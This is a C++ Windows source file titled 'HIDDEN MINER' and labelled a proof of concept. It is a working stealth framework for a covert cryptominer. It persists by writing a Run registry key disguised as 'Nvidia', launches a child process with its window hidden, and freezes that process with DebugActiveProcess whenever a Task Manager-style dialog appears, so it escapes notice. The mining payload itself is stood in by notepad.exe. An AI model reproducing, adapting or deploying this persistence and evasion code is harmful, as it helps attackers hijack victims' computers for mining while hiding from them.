// HIDDEN MINER (c) FORTRAN66
//
// IT`S NOT MALWARE BUT ONLY POC
// COMPILER: C++ Visual Studio 2015

#include <windows.h>
#include <stdint.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:miner_main ")

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

#define _wcscat(a,b) lstrcatW(a,b)
#define _wcslen(a) lstrlenW(a)

void _memset(void *s, uint8_t c, size_t n) {
  unsigned char *s_ = s;
  for (int i = 0; i < n; ++i) s_[i] = c;
  return;
}

DWORD dwHiddenProcessId = 0;

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
  HKEY hKey = NULL;
  LONG lResult = 0;
  BOOL fSuccess = TRUE;
  DWORD dwSize;
  WCHAR szValue[MAX_PATH*2];
  _memset(szValue, 0, MAX_PATH*4);
  szValue[0] = L'\"';
  _wcscat(szValue, pathToExe);
  _wcscat(szValue, L"\" " );
  if (args != NULL) {
    _wcscat(szValue, args);
  }
  lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
  fSuccess = (lResult == 0);
  if (fSuccess) {
    dwSize = (_wcslen(szValue) + 1) * 2;
    lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
    fSuccess = (lResult == 0);
  }
  if (hKey != NULL) {
    RegCloseKey(hKey);
    hKey = NULL;
  }
  return fSuccess;
}

DWORD WINAPI taskmgr_detector_thread(LPVOID *arg) {
  int flag = FALSE;
  while (TRUE) {
    if (FindWindowA("#32770", NULL)) {
      if (!flag)
        DebugActiveProcess(dwHiddenProcessId);
      flag = TRUE;
    } else {
      if (flag)
        DebugActiveProcessStop(dwHiddenProcessId);
      flag = FALSE;
    }
    Sleep(500);
  }
} 

void miner_main() {
  WCHAR szPathToExe[MAX_PATH];
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  _memset(&si, 0, sizeof(STARTUPINFOW));
  _memset(&pi, 0, sizeof(PROCESS_INFORMATION));
  si.cb = sizeof(STARTUPINFO);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
  RegisterMyProgramForStartup(L"Nvidia", szPathToExe, NULL);
  CreateProcessW(NULL, L"notepad.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
  dwHiddenProcessId = pi.dwProcessId;
  CreateThread(NULL, 0, &taskmgr_detector_thread, NULL, 0, NULL);
  Sleep(-1);
}
